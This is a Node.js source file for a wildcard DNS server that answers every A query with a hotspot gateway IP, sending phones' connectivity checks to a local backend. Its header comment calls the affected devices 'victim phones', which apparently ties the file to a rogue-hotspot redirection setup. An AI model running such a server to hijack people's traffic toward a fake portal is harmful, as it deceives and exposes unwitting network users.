/**
 * Minimal captive-portal DNS server.
 *
 * Listens on UDP port 53 and answers every A-record query with the
 * hotspot gateway IP so victim phones redirect their HTTP probe to
 * our backend (port 4000) instead of the real internet.
 *
 * No third-party packages — uses Node's built-in `dgram` module.
 */

'use strict';

const dgram = require('node:dgram');

// ── DNS wire-format helpers ───────────────────────────────────────────────────

function parseName(buf, offset) {
  const labels = [];
  let jumped = false;
  let end = -1;
  let safetyLimit = 128;

  while (safetyLimit-- > 0) {
    const len = buf[offset];
    if (len === undefined || len === 0) {
      if (!jumped) end = offset + 1;
      break;
    }
    // Pointer (compression)
    if ((len & 0xc0) === 0xc0) {
      if (!jumped) end = offset + 2;
      offset = ((len & 0x3f) << 8) | buf[offset + 1];
      jumped = true;
      continue;
    }
    labels.push(buf.slice(offset + 1, offset + 1 + len).toString('ascii'));
    offset += 1 + len;
  }

  return { name: labels.join('.'), end: end === -1 ? offset + 1 : end };
}

function encodeName(name) {
  const parts = name.split('.');
  const bufs = parts.map((p) => {
    const b = Buffer.alloc(1 + p.length);
    b[0] = p.length;
    b.write(p, 1, 'ascii');
    return b;
  });
  return Buffer.concat([...bufs, Buffer.alloc(1)]); // trailing 0
}

const DNS_TTL_SECONDS = 30; // short TTL keeps the popup fresh across reconnects

function buildResponse(queryBuf, gatewayIP) {
  // Parse query header
  const txId    = queryBuf.slice(0, 2);
  const flags   = queryBuf.readUInt16BE(2);
  const qdCount = queryBuf.readUInt16BE(4);
  if (qdCount === 0) return null;

  // Parse question section (domain name is consumed; we only need the end offset)
  const { end: qEnd } = parseName(queryBuf, 12);
  const qType = queryBuf.readUInt16BE(qEnd);

  // We answer A (1) and ANY (255) with the gateway IP.
  // For AAAA (28) and other types we return NOERROR with an empty answer so
  // the phone falls back to the IPv4 A record rather than treating the domain
  // as non-existent.
  const answerA = qType === 1 || qType === 255;
  const anCount = answerA ? 1 : 0;

  // Header: copy ID, set QR=1 AA=1 RD=1 RA=1, NOERROR
  const header = Buffer.alloc(12);
  txId.copy(header, 0);
  // QR=1, OPCODE=0, AA=1, TC=0, RD=bit from query, RA=1, RCODE=0
  const rd = flags & 0x0100;
  header.writeUInt16BE(0x8400 | rd, 2);
  header.writeUInt16BE(1, 4);      // qdcount
  header.writeUInt16BE(anCount, 6);
  header.writeUInt16BE(0, 8);      // nscount
  header.writeUInt16BE(0, 10);     // arcount (no OPT additional record)

  // Echo question
  const question = queryBuf.slice(12, qEnd + 4);

  const parts = [header, question];

  if (answerA) {
    // Answer RR: name pointer (0xc00c → offset 12), type A, class IN, TTL, rdlength 4, ip
    const answer = Buffer.alloc(16);
    answer.writeUInt16BE(0xc00c, 0); // pointer to question name
    answer.writeUInt16BE(1, 2);      // type A
    answer.writeUInt16BE(1, 4);      // class IN
    answer.writeUInt32BE(DNS_TTL_SECONDS, 6);
    answer.writeUInt16BE(4, 10);     // rdlength
    gatewayIP.split('.').forEach((octet, i) => { answer[12 + i] = Number.parseInt(octet, 10); });
    parts.push(answer);
  }

  return Buffer.concat(parts);
}

// ── Public API ────────────────────────────────────────────────────────────────

function createDNSServer(gatewayIP) {
  const server = dgram.createSocket('udp4');

  server.on('message', (msg, rinfo) => {
    try {
      const resp = buildResponse(msg, gatewayIP);
      if (resp) {
        console.log(`[DNS] Query from ${rinfo.address}:${rinfo.port} -> ${gatewayIP}`);
        server.send(resp, rinfo.port, rinfo.address);
      }
    } catch (err) {
      console.error('[DNS] Failed to process query:', err);
    }
  });

  return server;
}

module.exports = { createDNSServer };
